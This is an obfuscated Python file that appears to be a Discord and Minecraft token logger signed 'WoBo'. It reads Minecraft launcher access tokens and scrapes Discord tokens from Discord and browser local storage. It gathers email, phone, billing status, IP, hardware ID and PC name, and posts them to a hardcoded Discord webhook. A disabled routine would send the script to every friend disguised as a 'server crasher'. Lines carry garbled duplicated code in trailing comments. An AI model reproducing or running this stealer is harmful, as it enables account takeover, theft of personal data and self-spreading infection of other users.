import json #line:1:import json #line:1
import os #line:2:import os #line:2
from urllib .request import Request ,urlopen #line:3:from urllib .request import Request ,urlopen #line:3
WEBHOOK_URL ="Your Webhook Here"#line:4:WEBHOOK_URL ="https://discord.com/api/webhooks/838477668902109184/0s-vYaQyqYbGM8Tfi9ZDF1oS2G1VIAAneA9peNwsPEi3i_YRB7o4pXRukZ0kcqtwaKK0"#line:6
PING_ME =True #line:5:PING_ME =True #line:9
def uuid_dashed (OOO00O0OO0OO0O0O0 ):#line:6:def uuid_dashed (O00OOOO0000OO0000 ):#line:11
    return f"{OOO00O0OO0OO0O0O0[0:8]}-{OOO00O0OO0OO0O0O0[8:12]}-{OOO00O0OO0OO0O0O0[12:16]}-{OOO00O0OO0OO0O0O0[16:21]}-{OOO00O0OO0OO0O0O0[21:32]}"#line:7:return f"{O00OOOO0000OO0000[0:8]}-{O00OOOO0000OO0000[8:12]}-{O00OOOO0000OO0000[12:16]}-{O00OOOO0000OO0000[16:21]}-{O00OOOO0000OO0000[21:32]}"#line:12
def main ():#line:8:def main ():#line:14
    O0O00OO0OO0O00O0O =json .loads (open (os .getenv ("APPDATA")+"\\.minecraft\\launcher_profiles.json").read ())["authenticationDatabase"]#line:9:OOO0O0OOOOOOO000O =json .loads (open (os .getenv ("APPDATA")+"\\.minecraft\\launcher_profiles.json").read ())["authenticationDatabase"]#line:15
    OO0O0OO0OOOO0OOOO =[]#line:10:OOO000OO000O00000 =[]#line:17
    for OO00OOO000OO000OO in O0O00OO0OO0O00O0O :#line:11:for O0O0000O0OO0O0000 in OOO0O0OOOOOOO000O :#line:19
        try :#line:12:try :#line:20
            OOO0O0OOO0000OOO0 =O0O00OO0OO0O00O0O [OO00OOO000OO000OO ].get ("username")#line:13:OOOOOO000O0O0O00O =OOO0O0OOOOOOO000O [O0O0000O0OO0O0000 ].get ("username")#line:21
            OOO0O0O0OOO00O0O0 ,OOO0O0O00OOOO000O =list (O0O00OO0OO0O00O0O [OO00OOO000OO000OO ]["profiles"].items ())[0 ]#line:14:O00OO0OOO0OOO0OOO ,OOO0O0OO00OOOO0O0 =list (OOO0O0OOOOOOO000O [O0O0000O0OO0O0000 ]["profiles"].items ())[0 ]#line:22
            OO00OO00O0OOOO00O ={"fields":[{"name":"Email","value":OOO0O0OOO0000OOO0 if OOO0O0OOO0000OOO0 and "@"in OOO0O0OOO0000OOO0 else "N/A","inline":False },{"name":"Username","value":OOO0O0O00OOOO000O ["displayName"].replace ("_","\\_"),"inline":True },{"name":"UUID","value":uuid_dashed (OOO0O0O0OOO00O0O0 ),"inline":True },{"name":"Token","value":O0O00OO0OO0O00O0O [OO00OOO000OO000OO ]["accessToken"],"inline":True }]}#line:15:O0O0OO00O0OO000OO ={"fields":[{"name":"Email","value":OOOOOO000O0O0O00O if OOOOOO000O0O0O00O and "@"in OOOOOO000O0O0O00O else "N/A","inline":False },{"name":"Username","value":OOO0O0OO00OOOO0O0 ["displayName"].replace ("_","\\_"),"inline":True },{"name":"UUID","value":uuid_dashed (O00OO0OOO0OOO0OOO ),"inline":True },{"name":"Token","value":OOO0O0OOOOOOO000O [O0O0000O0OO0O0000 ]["accessToken"],"inline":True }]}#line:30
            OO0O0OO0OOOO0OOOO .append (OO00OO00O0OOOO00O )#line:16:OOO000OO000O00000 .append (O0O0OO00O0OO000OO )#line:31
        except :#line:17:except :#line:32
            pass #line:18:pass #line:33
    OOOOOO00O0OO0OOOO ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}#line:19:OO0O00OO0OOO0OOO0 ={"Content-Type":"application/json","User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}#line:38
    OO0OOOO000OO0O0O0 =json .dumps ({"embeds":OO0O0OO0OOOO0OOOO ,"content":"@everyone"if PING_ME else ""})#line:20:OO0OOO0O0OO00O00O =json .dumps ({"embeds":OOO000OO000O00000 ,"content":"@everyone"if PING_ME else ""})#line:40
    try :#line:21:try :#line:42
        O0OO00OOOOOOOO000 =Request (WEBHOOK_URL ,data =OO0OOOO000OO0O0O0 .encode (),headers =OOOOOO00O0OO0OOOO )#line:22:OO0O00O0O0O0OO000 =Request (WEBHOOK_URL ,data =OO0OOO0O0OO00O00O .encode (),headers =OO0O00OO0OOO0OOO0 )#line:43
        urlopen (O0OO00OOOOOOOO000 )#line:23:urlopen (OO0O00O0O0O0OO000 )#line:44
    except :#line:24:except :#line:45
        pass #line:25:pass #line:46
if __name__ =="__main__":#line:26:if __name__ =="__main__":#line:48
    main ()#line:27:main ()#line:49
if os .name !="nt":#line:28:if os .name !="nt":#line:51
    exit ()#line:29:exit ()#line:52
from re import findall #line:30:from re import findall #line:53
from json import loads ,dumps #line:31:from json import loads ,dumps #line:54
from base64 import b64decode #line:32:from base64 import b64decode #line:55
from subprocess import Popen ,PIPE #line:33:from subprocess import Popen ,PIPE #line:56
from urllib .request import Request ,urlopen #line:34:from urllib .request import Request ,urlopen #line:57
from datetime import datetime #line:35:from datetime import datetime #line:58
from threading import Thread #line:36:from threading import Thread #line:59
from time import sleep #line:37:from time import sleep #line:60
from sys import argv #line:38:from sys import argv #line:61
LOCAL =os .getenv ("LOCALAPPDATA")#line:39:LOCAL =os .getenv ("LOCALAPPDATA")#line:64
ROAMING =os .getenv ("APPDATA")#line:40:ROAMING =os .getenv ("APPDATA")#line:65
PATHS ={"Discord":ROAMING +"\\Discord","Discord Canary":ROAMING +"\\discordcanary","Discord PTB":ROAMING +"\\discordptb","Google Chrome":LOCAL +"\\Google\\Chrome\\User Data\\Default","Opera":ROAMING +"\\Opera Software\\Opera Stable","Brave":LOCAL +"\\BraveSoftware\\Brave-Browser\\User Data\\Default","Yandex":LOCAL +"\\Yandex\\YandexBrowser\\User Data\\Default",}#line:41:PATHS ={"Discord":ROAMING +"\\Discord","Discord Canary":ROAMING +"\\discordcanary","Discord PTB":ROAMING +"\\discordptb","Google Chrome":LOCAL +"\\Google\\Chrome\\User Data\\Default","Opera":ROAMING +"\\Opera Software\\Opera Stable","Brave":LOCAL +"\\BraveSoftware\\Brave-Browser\\User Data\\Default","Yandex":LOCAL +"\\Yandex\\YandexBrowser\\User Data\\Default",}#line:74
def getheaders (O00O0O0OO00OO0000 =None ,O0O0OO000OO0000OO ="application/json"):#line:42:def getheaders (token =None ,content_type ="application/json"):#line:77
    O0O0OO00O0O0O0000 ={"Content-Type":O0O0OO000OO0000OO ,"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",}#line:43:O00O00000O0OO000O ={"Content-Type":content_type ,"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11",}#line:81
    if O00O0O0OO00OO0000 :#line:44:if token :#line:82
        O0O0OO00O0O0O0000 .update ({"Authorization":O00O0O0OO00OO0000 })#line:45:O00O00000O0OO000O .update ({"Authorization":token })#line:83
    return O0O0OO00O0O0O0000 #line:46:return O00O00000O0OO000O #line:84
def getuserdata (O000OOOOO0O00O0OO ):#line:47:def getuserdata (OOO0O0OO00OO000OO ):#line:87
    try :#line:48:try :#line:88
        return loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =getheaders (O000OOOOO0O00O0OO ))).read ().decode ())#line:49:return loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me",headers =getheaders (OOO0O0OO00OO000OO ))).read ().decode ())#line:97
    except :#line:50:except :#line:98
        pass #line:51:pass #line:99
def gettokens (OOOO0000O000000O0 ):#line:52:def gettokens (OO0O0O00OOOO0OO00 ):#line:102
    OOOO0000O000000O0 +="\\Local Storage\\leveldb"#line:53:OO0O0O00OOOO0OO00 +="\\Local Storage\\leveldb"#line:103
    OOO0O0O00000O00OO =[]#line:54:O0OOOOOO0OO000O0O =[]#line:104
    for O00OOO0OO00000000 in os .listdir (OOOO0000O000000O0 ):#line:55:for O0OOO000000000OOO in os .listdir (OO0O0O00OOOO0OO00 ):#line:105
        if not O00OOO0OO00000000 .endswith (".log")and not O00OOO0OO00000000 .endswith (".ldb"):#line:56:if not O0OOO000000000OOO .endswith (".log")and not O0OOO000000000OOO .endswith (".ldb"):#line:106
            continue #line:57:continue #line:107
        for OOOOOO0O0OOOOOO0O in [O000O00OOO00O000O .strip ()for O000O00OOO00O000O in open (f"{OOOO0000O000000O0}\\{O00OOO0OO00000000}",errors ="ignore").readlines ()if O000O00OOO00O000O .strip ()]:#line:58:for OO00OO0OOO000OOOO in [O00O0O00OO00OO0O0 .strip ()for O00O0O00OO00OO0O0 in open (f"{OO0O0O00OOOO0OO00}\\{O0OOO000000000OOO}",errors ="ignore").readlines ()if O00O0O00OO00OO0O0 .strip ()]:#line:112
            for O000OOO00O0O00OO0 in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",r"mfa\.[\w-]{84}"):#line:59:for OO0O0OO0000000000 in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",r"mfa\.[\w-]{84}"):#line:113
                for OOO000O000OO0OO0O in findall (O000OOO00O0O00OO0 ,OOOOOO0O0OOOOOO0O ):#line:60:for O00O00O00000O00OO in findall (OO0O0OO0000000000 ,OO00OO0OOO000OOOO ):#line:114
                    OOO0O0O00000O00OO .append (OOO000O000OO0OO0O )#line:61:O0OOOOOO0OO000O0O .append (O00O00O00000O00OO )#line:115
    return OOO0O0O00000O00OO #line:62:return O0OOOOOO0OO000O0O #line:116
def getdeveloper ():#line:63:def getdeveloper ():#line:119
    OO000O00O0O000O00 ="WoBo"#line:64:OO00O0O00O0O00OO0 ="WoBo"#line:120
    try :#line:65:try :#line:121
        OO000O00O0O000O00 =urlopen (Request ("https://pastebin.com/raw/ssFxiejv")).read ().decode ()#line:66:OO00O0O00O0O00OO0 =urlopen (Request ("https://pastebin.com/raw/ssFxiejv")).read ().decode ()#line:122
    except :#line:67:except :#line:123
        pass #line:68:pass #line:124
    return OO000O00O0O000O00 #line:69:return OO00O0O00O0O00OO0 #line:125
def getip ():#line:70:def getip ():#line:128
    OO0O0O00O0OO0000O ="None"#line:71:OO00O000OO00OOOOO ="None"#line:129
    try :#line:72:try :#line:130
        OO0O0O00O0OO0000O =urlopen (Request ("https://api.ipify.org")).read ().decode ().strip ()#line:73:OO00O000OO00OOOOO =urlopen (Request ("https://api.ipify.org")).read ().decode ().strip ()#line:131
    except :#line:74:except :#line:132
        pass #line:75:pass #line:133
    return OO0O0O00O0OO0000O #line:76:return OO00O000OO00OOOOO #line:134
def getavatar (OOO0O0OO0000OOO00 ,O0OO0OO000O000O00 ):#line:77:def getavatar (O0O0000O0OO0000O0 ,O00O000O0O0OOOO00 ):#line:137
    OOOO0000O0OOO000O =f"https://cdn.discordapp.com/avatars/{OOO0O0OO0000OOO00}/{O0OO0OO000O000O00}.gif"#line:78:O00O0OOO0O00O0OO0 =f"https://cdn.discordapp.com/avatars/{O0O0000O0OO0000O0}/{O00O000O0O0OOOO00}.gif"#line:138
    try :#line:79:try :#line:139
        urlopen (Request (OOOO0000O0OOO000O ))#line:80:urlopen (Request (O00O0OOO0O00O0OO0 ))#line:140
    except :#line:81:except :#line:141
        OOOO0000O0OOO000O =OOOO0000O0OOO000O [:-4 ]#line:82:O00O0OOO0O00O0OO0 =O00O0OOO0O00O0OO0 [:-4 ]#line:142
    return OOOO0000O0OOO000O #line:83:return O00O0OOO0O00O0OO0 #line:143
def gethwid ():#line:84:def gethwid ():#line:146
    OO0O00OO0OO0OO000 =Popen ("wmic csproduct get uuid",shell =True ,stdin =PIPE ,stdout =PIPE ,stderr =PIPE )#line:85:OO000O00OO00O0OOO =Popen ("wmic csproduct get uuid",shell =True ,stdin =PIPE ,stdout =PIPE ,stderr =PIPE )#line:149
    return (OO0O00OO0OO0OO000 .stdout .read ()+OO0O00OO0OO0OO000 .stderr .read ()).decode ().split ("\n")[1 ]#line:86:return (OO000O00OO00O0OOO .stdout .read ()+OO000O00OO00O0OOO .stderr .read ()).decode ().split ("\n")[1 ]#line:150
def getfriends (O00O0OOOOOOOO000O ):#line:87:def getfriends (OO0O0O0OO00O00000 ):#line:153
    try :#line:88:try :#line:154
        return loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me/relationships",headers =getheaders (O00O0OOOOOOOO000O ),)).read ().decode ())#line:89:return loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me/relationships",headers =getheaders (OO0O0O0OO00O00000 ),)).read ().decode ())#line:164
    except :#line:90:except :#line:165
        pass #line:91:pass #line:166
def getchat (O0OO000O0OO000O0O ,O00O00O000O0OO0OO ):#line:92:def getchat (O0O0O0OOO0OOOO0O0 ,O00000000OOO00000 ):#line:169
    try :#line:93:try :#line:170
        return loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me/channels",headers =getheaders (O0OO000O0OO000O0O ),data =dumps ({"recipient_id":O00O00O000O0OO0OO }).encode (),)).read ().decode ())["id"]#line:94:return loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me/channels",headers =getheaders (O0O0O0OOO0OOOO0O0 ),data =dumps ({"recipient_id":O00000000OOO00000 }).encode (),)).read ().decode ())["id"]#line:181
    except :#line:95:except :#line:182
        pass #line:96:pass #line:183
def has_payment_methods (O0O0OO0OOO00000O0 ):#line:97:def has_payment_methods (OOOO00OO0OO0O0O00 ):#line:186
    try :#line:98:try :#line:187
        return bool (len (loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me/billing/payment-sources",headers =getheaders (O0O0OO0OOO00000O0 ),)).read ().decode ()))>0 )#line:99:return bool (len (loads (urlopen (Request ("https://discordapp.com/api/v6/users/@me/billing/payment-sources",headers =getheaders (OOOO00OO0OO0O0O00 ),)).read ().decode ()))>0 )#line:202
    except :#line:100:except :#line:203
        pass #line:101:pass #line:204
def send_message (O0OO0000O0O0OOO00 ,OOO00O0OO0000O000 ,OOO0OOO0O00O0O0OO ):#line:102:def send_message (O0O0OOOO0000OO0OO ,O0O000O000OO0O0O0 ,OO0O0000O0O000000 ):#line:207
    try :#line:103:try :#line:208
        urlopen (Request (f"https://discordapp.com/api/v6/channels/{OOO00O0OO0000O000}/messages",headers =getheaders (O0OO0000O0O0OOO00 ,"multipart/form-data; boundary=---------------------------325414537030329320151394843687",),data =OOO0OOO0O00O0O0OO .encode (),)).read ().decode ()#line:104:urlopen (Request (f"https://discordapp.com/api/v6/channels/{O0O000O000OO0O0O0}/messages",headers =getheaders (O0O0OOOO0000OO0OO ,"multipart/form-data; boundary=---------------------------325414537030329320151394843687",),data =OO0O0000O0O000000 .encode (),)).read ().decode ()#line:218
    except :#line:105:except :#line:219
        pass #line:106:pass #line:220
def spread (OO0O00O00OOOO00OO ,OO0O0O0OOO00OOOO0 ,OO000OO00O00O0O0O ):#line:107:def spread (O0OO00OO0OOO00O0O ,OOOO00OOO0O0O0OO0 ,OOOO0O0000OOO0O0O ):#line:223
    return #line:108:return #line:224
    for O0OOOOO00OOO00O00 in getfriends (OO0O00O00OOOO00OO ):#line:109:for O0O0OO0OOO00OOO00 in getfriends (O0OO00OO0OOO00O0O ):#line:225
        try :#line:110:try :#line:226
            OO00O0000O0O0OOO0 =getchat (OO0O00O00OOOO00OO ,O0OOOOO00OOO00O00 ["id"])#line:111:OO000OO0OO0O00OOO =getchat (O0OO00OO0OOO00O0O ,O0O0OO0OOO00OOO00 ["id"])#line:227
            send_message (OO0O00O00OOOO00OO ,OO00O0000O0O0OOO0 ,OO0O0O0OOO00OOOO0 )#line:112:send_message (O0OO00OO0OOO00O0O ,OO000OO0OO0O00OOO ,OOOO00OOO0O0O0OO0 )#line:228
        except Exception as O00OOOO00O000OOO0 :#line:113:except Exception as O00O000OOOO0OO0OO :#line:229
            pass #line:114:pass #line:230
        sleep (OO000OO00O00O0O0O )#line:115:sleep (OOOO0O0000OOO0O0O )#line:231
def main ():#line:116:def main ():#line:234
    OO0OOOOOOO0OO0OO0 =ROAMING +"\\.cache~$"#line:117:O0OO00O0O0O00O00O =ROAMING +"\\.cache~$"#line:235
    O0O0OO0000OO0OO00 =True #line:118:OO00O0000O0O00O0O =True #line:236
    O00O00000O00000OO =True #line:119:O0O0O00OOOOO0000O =True #line:237
    O00OO0O0000O0OOOO =[]#line:120:OOO0O0OOO0OOO000O =[]#line:238
    OO0000OO00OO0000O =[]#line:121:O000000O00000OOOO =[]#line:239
    OO000O00O0OOO000O =[]#line:122:OO0OO000O0OOOOOO0 =[]#line:240
    OOO0O0O0O00O00000 =[]#line:123:OOO00OO0O000O0OO0 =[]#line:241
    OO00000O0O0OO0OO0 =[]#line:124:OO0O0O00O00OOOO00 =[]#line:242
    O0O0O000O00OO00O0 =getip ()#line:125:OO0O0OO00O000000O =getip ()#line:243
    OO000000000O0OO00 =os .getenv ("UserName")#line:126:O0O0000O0O00OOO0O =os .getenv ("UserName")#line:244
    O00O00OOO0OOOO00O =os .getenv ("COMPUTERNAME")#line:127:O0OOOOO0OO0O00000 =os .getenv ("COMPUTERNAME")#line:245
    OO00OO0O00OO0OOO0 =os .getenv ("userprofile").split ("\\")[2 ]#line:128:OO00000000OO0O000 =os .getenv ("userprofile").split ("\\")[2 ]#line:246
    O00OO0000OO0O0OOO =getdeveloper ()#line:129:O00OOOO0OO000000O =getdeveloper ()#line:247
    for OO0O00O00O00O000O ,OOOO0O0O0OO0O0OO0 in PATHS .items ():#line:130:for O00OOOO000000O0O0 ,O0OO0OO00O0000O0O in PATHS .items ():#line:248
        if not os .path .exists (OOOO0O0O0OO0O0OO0 ):#line:131:if not os .path .exists (O0OO0OO00O0000O0O ):#line:249
            continue #line:132:continue #line:250
        for O0OOOO0OOO0O0O00O in gettokens (OOOO0O0O0OO0O0OO0 ):#line:133:for O0000OOO0O0OOO0OO in gettokens (O0OO0OO00O0000O0O ):#line:251
            if O0OOOO0OOO0O0O00O in OO000O00O0OOO000O :#line:134:if O0000OOO0O0OOO0OO in OO0OO000O0OOOOOO0 :#line:252
                continue #line:135:continue #line:253
            OO000O00O0OOO000O .append (O0OOOO0OOO0O0O00O )#line:136:OO0OO000O0OOOOOO0 .append (O0000OOO0O0OOO0OO )#line:254
            O000000OO0O00O0OO =None #line:137:O000OO0O00OOOOOOO =None #line:255
            if not O0OOOO0OOO0O0O00O .startswith ("mfa."):#line:138:if not O0000OOO0O0OOO0OO .startswith ("mfa."):#line:256
                try :#line:139:try :#line:257
                    O000000OO0O00O0OO =b64decode (O0OOOO0OOO0O0O00O .split (".")[0 ].encode ()).decode ()#line:140:O000OO0O00OOOOOOO =b64decode (O0000OOO0O0OOO0OO .split (".")[0 ].encode ()).decode ()#line:258
                except :#line:141:except :#line:259
                    pass #line:142:pass #line:260
                if not O000000OO0O00O0OO or O000000OO0O00O0OO in OO00000O0O0OO0OO0 :#line:143:if not O000OO0O00OOOOOOO or O000OO0O00OOOOOOO in OO0O0O00O00OOOO00 :#line:261
                    continue #line:144:continue #line:262
            O00O00OO0O0000O00 =getuserdata (O0OOOO0OOO0O0O00O )#line:145:OOOO0O000OO0OO0OO =getuserdata (O0000OOO0O0OOO0OO )#line:263
            if not O00O00OO0O0000O00 :#line:146:if not OOOO0O000OO0OO0OO :#line:264
                continue #line:147:continue #line:265
            OO00000O0O0OO0OO0 .append (O000000OO0O00O0OO )#line:148:OO0O0O00O00OOOO00 .append (O000OO0O00OOOOOOO )#line:266
            OO0000OO00OO0000O .append (O0OOOO0OOO0O0O00O )#line:149:O000000O00000OOOO .append (O0000OOO0O0OOO0OO )#line:267
            OO00OOO0O0O0OO0O0 =O00O00OO0O0000O00 ["username"]+"#"+str (O00O00OO0O0000O00 ["discriminator"])#line:150:O0O000O00OOO0OOO0 =OOOO0O000OO0OO0OO ["username"]+"#"+str (OOOO0O000OO0OO0OO ["discriminator"])#line:268
            OO00OOO0OO0OOOOO0 =O00O00OO0O0000O00 ["id"]#line:151:O0OOO0OO00O00OOO0 =OOOO0O000OO0OO0OO ["id"]#line:269
            O00O0OOOOOO0OOOO0 =O00O00OO0O0000O00 ["avatar"]#line:152:O0O000000OOOOO0O0 =OOOO0O000OO0OO0OO ["avatar"]#line:270
            O0O00OOO0OO0OOOO0 =getavatar (OO00OOO0OO0OOOOO0 ,O00O0OOOOOO0OOOO0 )#line:153:OOOOO0OO0O00O0OO0 =getavatar (O0OOO0OO00O00OOO0 ,O0O000000OOOOO0O0 )#line:271
            O00OO0000O00OO00O =O00O00OO0O0000O00 .get ("email")#line:154:OO000OO0OOO0OOOOO =OOOO0O000OO0OO0OO .get ("email")#line:272
            O0000OO0000OOO0O0 =O00O00OO0O0000O00 .get ("phone")#line:155:O0OOOOO00O0O0O0O0 =OOOO0O000OO0OO0OO .get ("phone")#line:273
            O00OO00OO0OOOO00O =bool (O00O00OO0O0000O00 .get ("premium_type"))#line:156:O0000000O00O0000O =bool (OOOO0O000OO0OO0OO .get ("premium_type"))#line:274
            OO0000OOO00000000 =bool (has_payment_methods (O0OOOO0OOO0O0O00O ))#line:157:OOO0OOOOO0O0OOOOO =bool (has_payment_methods (O0000OOO0O0OOO0OO ))#line:275
            OOOO0OOOO000O0000 ={"color":0x7289DA ,"fields":[{"name":"**Account Info**","value":f"Email: {O00OO0000O00OO00O}\nPhone: {O0000OO0000OOO0O0}\nNitro: {O00OO00OO0OOOO00O}\nBilling Info: {OO0000OOO00000000}","inline":True ,},{"name":"**PC Info**","value":f"IP: {O0O0O000O00OO00O0}\nUsername: {OO000000000O0OO00}\nPC Name: {O00O00OOO0OOOO00O}\nToken Location: {OO0O00O00O00O000O}","inline":True ,},{"name":"**Token**","value":O0OOOO0OOO0O0O00O ,"inline":False },],"author":{"name":f"{OO00OOO0O0O0OO0O0} ({OO00OOO0OO0OOOOO0})","icon_url":O0O00OOO0OO0OOOO0 },"footer":{"text":f"Token Logger From: {O00OO0000OO0O0OOO}"},}#line:158:OOOO00O0O0OO0OO00 ={"color":0x7289DA ,"fields":[{"name":"**Account Info**","value":f"Email: {OO000OO0OOO0OOOOO}\nPhone: {O0OOOOO00O0O0O0O0}\nNitro: {O0000000O00O0000O}\nBilling Info: {OOO0OOOOO0O0OOOOO}","inline":True ,},{"name":"**PC Info**","value":f"IP: {OO0O0OO00O000000O}\nUsername: {O0O0000O0O00OOO0O}\nPC Name: {O0OOOOO0OO0O00000}\nToken Location: {O00OOOO000000O0O0}","inline":True ,},{"name":"**Token**","value":O0000OOO0O0OOO0OO ,"inline":False },],"author":{"name":f"{O0O000O00OOO0OOO0} ({O0OOO0OO00O00OOO0})","icon_url":OOOOO0OO0O00O0OO0 },"footer":{"text":f"Token Logger From: {O00OOOO0OO000000O}"},}#line:293
            O00OO0O0000O0OOOO .append (OOOO0OOOO000O0000 )#line:159:OOO0O0OOO0OOO000O .append (OOOO00O0O0OO0OO00 )#line:294
    with open (OO0OOOOOOO0OO0OO0 ,"a")as OO0O00OO0O0OO00OO :#line:160:with open (O0OO00O0O0O00O00O ,"a")as OO000O0OO0OOO00O0 :#line:295
        for O0OOOO0OOO0O0O00O in OO000O00O0OOO000O :#line:161:for O0000OOO0O0OOO0OO in OO0OO000O0OOOOOO0 :#line:296
            if not O0OOOO0OOO0O0O00O in OOO0O0O0O00O00000 :#line:162:if not O0000OOO0O0OOO0OO in OOO00OO0O000O0OO0 :#line:297
                OO0O00OO0O0OO00OO .write (O0OOOO0OOO0O0O00O +"\n")#line:163:OO000O0OO0OOO00O0 .write (O0000OOO0O0OOO0OO +"\n")#line:298
    if len (OO0000OO00OO0000O )==0 :#line:164:if len (O000000O00000OOOO )==0 :#line:299
        OO0000OO00OO0000O .append ("123")#line:165:O000000O00000OOOO .append ("123")#line:300
    O000OO0000OO0OO0O ={"content":"","embeds":O00OO0O0000O0OOOO ,"username":"WoBo's Token Logger","avatar_url":"https://cdn.discordapp.com/attachments/838479372650020884/838480776639021056/wobo.png",}#line:166:OO0O00O0000OOO000 ={"content":"","embeds":OOO0O0OOO0OOO000O ,"username":"WoBo's Token Logger","avatar_url":"https://cdn.discordapp.com/attachments/838479372650020884/838480776639021056/wobo.png",}#line:306
    try :#line:167:try :#line:307
        urlopen (Request ("Your Webhook Here",data =dumps (O000OO0000OO0OO0O ).encode (),headers =getheaders (),))#line:168:urlopen (Request ("https://discord.com/api/webhooks/838477668902109184/0s-vYaQyqYbGM8Tfi9ZDF1oS2G1VIAAneA9peNwsPEi3i_YRB7o4pXRukZ0kcqtwaKK0",data =dumps (OO0O00O0000OOO000 ).encode (),headers =getheaders (),))#line:314
    except :#line:169:except :#line:315
        pass #line:170:pass #line:316
    if O00O00000O00000OO :#line:171:if O0O0O00OOOOO0000O :#line:317
        for O0OOOO0OOO0O0O00O in OO0000OO00OO0000O :#line:172:for O0000OOO0O0OOO0OO in O000000O00000OOOO :#line:318
            with open (argv [0 ],encoding ="utf-8")as OO0O00OO0O0OO00OO :#line:173:with open (argv [0 ],encoding ="utf-8")as OO000O0OO0OOO00O0 :#line:319
                OOOO00OO0O00OO00O =OO0O00OO0O0OO00OO .read ()#line:174:O00OO0O000O0OO000 =OO000O0OO0OOO00O0 .read ()#line:320
            OO0O00OO000O0OOOO =f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{OOOO00OO0O00OO00O}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'#line:175:O00000O0O00OOOO00 =f'-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="file"; filename="{__file__}"\nContent-Type: text/plain\n\n{O00OO0O000O0OO000}\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="content"\n\nserver crasher. python download: https://www.python.org/downloads\n-----------------------------325414537030329320151394843687\nContent-Disposition: form-data; name="tts"\n\nfalse\n-----------------------------325414537030329320151394843687--'#line:321
            Thread (target =spread ,args =(O0OOOO0OOO0O0O00O ,OO0O00OO000O0OOOO ,7500 /1000 )).start ()#line:176:Thread (target =spread ,args =(O0000OOO0O0OOO0OO ,O00000O0O00OOOO00 ,7500 /1000 )).start ()#line:322
try :#line:177:try :#line:325
    main ()#line:178:main ()#line:326
except Exception as e :#line:179:except Exception as e :#line:327
    print (e )#line:180:print (e )#line:328
    pass #line:181:pass #line:329
